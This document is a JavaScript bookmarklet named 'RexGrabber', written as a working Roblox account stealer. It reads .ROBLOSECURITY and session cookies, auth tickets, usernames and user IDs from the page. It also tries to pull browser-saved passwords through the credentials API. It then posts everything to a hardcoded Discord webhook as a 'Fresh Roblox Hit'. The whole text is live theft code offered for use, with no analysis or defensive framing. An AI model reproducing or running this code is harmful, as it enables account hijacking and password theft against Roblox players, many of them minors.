javascript:(function(){
    const webhook = 'https://discord.com/api/webhooks/1443333736807530658/9FT-4lRNL0QfqEt_3u-nk_FRusHDwyISKdecSk-yhXbyPXOMQP39a_2p3UvQl441nStc';
    
    let loot = {
        url: location.href,
        useragent: navigator.userAgent,
        roblox: {},
        passwords: []
    };

    // 1. Grab every Roblox cookie we can find
    document.cookie.split(';').forEach(c => {
        if (c.includes('.ROBLOSECURITY')) {
            loot.roblox.robloseCURITY = c.split('=')[1];
        }
        if (c.includes('RBXSession')) loot.roblox.session = c.trim();
        if (c.includes('GuestData')) loot.roblox.guest = c.trim();
    });

    // 2. Try to pull Roblox user info if logged in (works on most roblox pages)
    try {
        const authTicket = document.querySelector('[data-authticket]')?.getAttribute('data-authticket');
        if (authTicket) loot.roblox.authTicket = authTicket;

        const userId = document.querySelector('[data-userid]')?.getAttribute('data-userid');
        const username = document.querySelector('[data-username]')?.getAttribute('data-username');
        if (userId) loot.roblox.userId = userId;
        if (username) loot.roblox.username = username;
    } catch(e){}

    // 3. Scrape any visible Roblox username / ID in the page (just in case)
    const pageText = document.body.innerText;
    const idMatch = pageText.match(/UserID[:\s]+(\d+)/i);
    const nameMatch = pageText.match(/Username[:\s]+([A-Za-z0-9_]+)/i);
    if (idMatch) loot.roblox.pageUserId = idMatch[1];
    if (nameMatch) loot.roblox.pageUsername = nameMatch[1];

    // 4. Bonus: Try to grab saved passwords via the browser’s password manager (works when the user allows it)
    try {
        if (navigator.credentials && navigator.credentials.get) {
            navigator.credentials.get({password: true}).then(cred => {
                if (cred && cred.password) {
                    loot.passwords.push({site: cred.id || location.hostname, user: cred.name, pass: cred.password});
                    sendLoot();
                }
            });
        }
    } catch(e){}

    // 5. Send everything to your webhook
    function sendLoot() {
        fetch(webhook, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                username: "RexGrabber",
                avatar_url: "https://i.imgur.com/removed.png",
                embeds: [{
                    title: "Fresh Roblox Hit 🎯",
                    color: 0x00ff00,
                    fields: [
                        {name: "Page", value: loot.url, inline: false},
                        {name: ".ROBLOSECURITY", value: loot.roblox.robloseCURITY ? "```" + loot.roblox.robloseCURITY.substring(0,60) + "```" : "❌ Not found", inline: false},
                        {name: "Username", value: loot.roblox.username || loot.roblox.pageUsername || "Unknown", inline: true},
                        {name: "User ID", value: loot.roblox.userId || loot.roblox.pageUserId || "Unknown", inline: true},
                        {name: "Saved Passwords Found", value: loot.passwords.length > 0 ? loot.passwords.map(p=>`${p.site} → ${p.user}:${p.pass}`).join('\n') : "None", inline: false}
                    ],
                    footer: {text: new Date().toLocaleString()}
                }]
            })
        });
    }

    sendLoot();  // Fire immediately with whatever we already grabbed
})();
